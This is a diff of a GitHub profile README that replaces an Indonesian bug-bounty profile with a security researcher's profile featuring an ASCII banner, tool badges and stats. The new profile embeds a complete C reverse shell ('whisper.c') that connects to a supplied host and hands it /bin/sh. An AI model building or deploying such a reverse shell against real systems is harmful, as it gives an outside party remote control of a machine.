@@ -1,85 +1,100 @@
-<h1 align="center">Hi, I'm alfaCyber7 👋</h1>
-<p align="center">
-  <b>Bug Bounty Hunter | Security Researcher | Ethical Hacker</b>
-</p>
-
-<p align="center">
-  <a href="https://github.com/alfacyber7">
-    <img src="https://img.shields.io/badge/GitHub-alfacyber7-181717?style=flat&logo=github" alt="GitHub">
-  </a>
-  <!-- Tambahkan link sosmed/bug bounty lo di sini -->
-</p>
-
----
-
-## 🚀 About Me
-
-Saya seorang **Bug Bounty Hunter** dan **Security Researcher** yang fokus pada web application security, reconnaissance, dan vulnerability assessment.
-
-Saat ini saya aktif mencari dan melaporkan kerentanan secara bertanggung jawab melalui program bug bounty, dengan tujuan membuat internet menjadi tempat yang lebih aman.
-
-- 🔭 Fokus: **Web Security, API Security, Recon & Automation**
-- 🛠️ Tools favorit: **Burp Suite, Nuclei, ffuf, amass, subfinder, httpx**
-- 🌱 Sedang mendalami: **Advanced SSRF, IDOR, Authentication Bypass, Cloud Security**
-- 📝 Menulis writeup bug bounty & security research
-
----
-
-## 🛡️ Tech Stack & Tools
-
-<p align="left">
-  <img src="https://img.shields.io/badge/Python-3776AB?style=flat&logo=python&logoColor=white" alt="Python">
-  <img src="https://img.shields.io/badge/Bash-121011?style=flat&logo=gnu-bash&logoColor=white" alt="Bash">
-  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=flat&logo=javascript&logoColor=black" alt="JavaScript">
-  <img src="https://img.shields.io/badge/Burp%20Suite-FF6633?style=flat&logo=burpsuite&logoColor=white" alt="Burp Suite">
-  <img src="https://img.shields.io/badge/Linux-FCC624?style=flat&logo=linux&logoColor=black" alt="Linux">
-  <img src="https://img.shields.io/badge/Git-F05032?style=flat&logo=git&logoColor=white" alt="Git">
-</p>
-
----
-
-## 📚 Bug Bounty Writeups
-
-| Date | Target/Program | Vulnerability | Status |
-|------|----------------|---------------|--------|
-| `Coming soon` | - | - | - |
-
-> ⚠️ Semua writeup di sini hanya membagikan kasus yang sudah **diperbolehkan untuk dipublikasikan** dan tidak mengandung data sensitif perusahaan.
-
----
-
-## ⚙️ Security Tools & Scripts
-
-Repo-repo tools dan automation yang saya gunakan untuk kegiatan security testing secara legal dan bertanggung jawab:
-
-- [`recon-toolkit`](https://github.com/alfacyber7) *(coming soon)* — kumpulan script reconnaissance untuk bug bounty.
-- [`nuclei-custom-templates`](https://github.com/alfacyber7) *(coming soon)* — custom Nuclei templates hasil riset pribadi.
-
----
-
-## 📊 GitHub Stats
-
-<p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=alfacyber7&show_icons=true&theme=tokyonight&hide_border=true" alt="GitHub Stats" width="48%">
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=alfacyber7&layout=compact&theme=tokyonight&hide_border=true" alt="Top Languages" width="48%">
-</p>
-
----
-
-## 📬 Contact
-
-- GitHub: [@alfacyber7](https://github.com/alfacyber7)
-- LinkedIn/Twitter/X: *(tambahkan link lo)*
-- Bug Bounty Platforms: HackerOne / Bugcrowd / Intigriti *(tambahkan link lo)*
-
-> 💬 **Open for collaboration** pada project security research, CTF team, atau diskusi bug bounty.
-
----
-
-## ⚠️ Disclaimer
-
-Semua aktivitas security research yang saya lakukan mengikuti aturan **responsible disclosure** dan **program bug bounty** yang berlaku. Tools dan script yang saya bagikan hanya untuk **testing yang diizinkan secara eksplisit**. Saya tidak bertanggung jawab atas penyalahgunaan tools atau informasi di repo ini.
+<div align="center">
 
 ```
-All activities are for educational and authorized security testing purposes only.
+                ____         __    _                     
+   ____  __  __/ / /      __/ /_  (_)________  ___  _____
+  / __ \/ / / / / / | /| / / __ \/ / ___/ __ \/ _ \/ ___/
+ / / / / /_/ / / /| |/ |/ / / / / (__  ) /_/ /  __/ /    
+/_/ /_/\__,_/_/_/ |__/|__/_/ /_/_/____/ .___/\___/_/     
+                                     /_/                 
 ```
+
+Vulnerability Research  ·  Exploit Development  ·  Reverse Engineering
+
+`offensive security researcher · bug bounty hunter · 0-day research`
+
+[![GitHub](https://img.shields.io/badge/GitHub-nullwhisper-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/nullwhisper)
+[![Profile Views](https://komarev.com/ghpvc/?username=nullwhisper&style=flat-square&color=0f7fc1)](https://github.com/nullwhisper)
+
+<br>
+
+```c
+/*
+ * whisper.c — minimal reverse shell, stripped
+ * build: gcc -s -fno-stack-protector -z execstack -o whisper whisper.c
+ * usage: ./whisper <host> <port>
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+int main(int argc, char **argv) {
+    if (argc != 3) {
+        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
+        return 1;
+    }
+
+    const char *host = argv[1];
+    int port = atoi(argv[2]);
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return 1;
+
+    struct sockaddr_in sin = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(port),
+    };
+    inet_aton(host, &sin.sin_addr);
+
+    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+        return 1;
+
+    dup2(sock, STDIN_FILENO);
+    dup2(sock, STDOUT_FILENO);
+    dup2(sock, STDERR_FILENO);
+
+    char *shell = "/bin/sh";
+    char *args[] = { shell, NULL };
+    execve(shell, args, NULL);
+
+    return 0;
+}
+```
+
+<br>
+
+Research published for educational and authorized testing purposes only. CVEs under responsible disclosure.
+
+</div>
+
+---
+
+<div align="center">
+
+### ⚔️ Arsenal
+
+![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
+![Go](https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white)
+![C](https://img.shields.io/badge/C-00599C?style=flat-square&logo=c&logoColor=white)
+![Bash](https://img.shields.io/badge/Bash-121011?style=flat-square&logo=gnu-bash&logoColor=white)
+
+![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=burpsuite&logoColor=white)
+![Nuclei](https://img.shields.io/badge/Nuclei-1B1B1D?style=flat-square)
+![Frida](https://img.shields.io/badge/Frida-FF4081?style=flat-square)
+![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=wireshark&logoColor=white)
+
+### 📊 Stats
+
+<img src="https://github-readme-stats.vercel.app/api?username=nullwhisper&show_icons=true&theme=dark&hide_border=true&bg_color=0d1117&text_color=0f7fc1&icon_color=0f7fc1" alt="GitHub Stats" width="49%">
+<img src="https://github-readme-activity-graph.vercel.app/graph?username=nullwhisper&theme=github-dark&hide_border=true&bg_color=0d1117&color=0f7fc1" alt="Activity Graph" width="49%">
+
+### 📡 Reach
+
+| Platform | Handle |
+|----------|--------|
+| GitHub | [@nullwhisper](https://github.com/nullwhisper) |
+
+</div>
